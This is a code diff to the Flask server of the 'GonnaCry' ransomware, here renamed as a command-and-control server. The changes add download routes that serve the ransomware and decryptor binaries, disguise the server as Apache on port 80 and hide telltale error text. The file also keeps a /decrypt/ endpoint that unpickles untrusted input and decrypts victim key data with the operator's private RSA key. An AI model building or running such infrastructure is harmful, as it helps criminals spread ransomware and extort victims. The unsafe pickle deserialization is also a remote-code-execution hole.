@@ -1,49 +1,46 @@
-from flask import Flask, redirect, request, Response
-from flask import render_template, url_for
+from flask import Flask, request, Response, send_file
 import os
-import time
 import base64
-import json
 import pickle
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 
-binaries_path = 'binaries/'
-gonnacry_binary = 'binaries/gonnacry'
-decryptor_binary = 'binaries/decryptor'
+binaries_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'binaries')
 
-headers = {'Server':'GonnaCry WebServer'}
+headers = {'Server': 'Apache/2.4.41 (Ubuntu)'}
 
 with open("private_key.key") as f:
     private_key = f.read()
 
-with open("public_key.key") as f:
-    public_key = f.read()
+app = Flask("gonnacry-c2")
 
-app = Flask("gonnacry-web-server")
 
 @app.errorhandler(404)
 def page_not_found(error):
-	return Response("nothing to do here ...", status=404, headers=headers)
+    return Response("Not Found", status=404, headers=headers)
+
 
 @app.errorhandler(500)
 def internal_error(error):
-	return Response("nothing to do here ...", status=404, headers=headers)
-
-
-@app.route("/recive-keys/", methods=['POST'])
-def recive_keys():
-    return ''
+    return Response("Internal Server Error", status=500, headers=headers)
 
 
 @app.route("/download-gonnacry/", methods=["GET"])
 def download_gonnacry():
-    return ''
+    binary = os.path.join(binaries_dir, 'gonnacry')
+    if not os.path.isfile(binary):
+        return Response("Not available.", status=404, headers=headers)
+    return send_file(binary, mimetype='application/octet-stream',
+                     as_attachment=True, download_name='gonnacry')
 
 
 @app.route("/download-decryptor/", methods=["GET"])
 def download_decryptor():
-    return ''
+    binary = os.path.join(binaries_dir, 'decryptor')
+    if not os.path.isfile(binary):
+        return Response("Not available.", status=404, headers=headers)
+    return send_file(binary, mimetype='application/octet-stream',
+                     as_attachment=True, download_name='decryptor')
 
 
 @app.route("/decrypt/", methods=['POST'])
@@ -55,7 +52,7 @@ def decrypt():
     try:
         enc_list = pickle.loads(base64.b64decode(data))
     except Exception:
-        return Response('Wrong format. Expected: b64(pickle(encrypted_chunks))', status=415, headers=headers)
+        return Response('Wrong format.', status=415, headers=headers)
 
     rsa_key = RSA.importKey(private_key)
     cipher = PKCS1_OAEP.new(rsa_key)
@@ -70,11 +67,9 @@ def decrypt():
 
 
 @app.route("/")
-def main():
-    return 'nothing to do here ... '
+def index():
+    return Response("", status=200, headers=headers)
+
 
 if __name__ == '__main__':
-
-    port = 8000
-    host = '0.0.0.0'
-    app.run(host=host, port=port)
+    app.run(host='0.0.0.0', port=80)
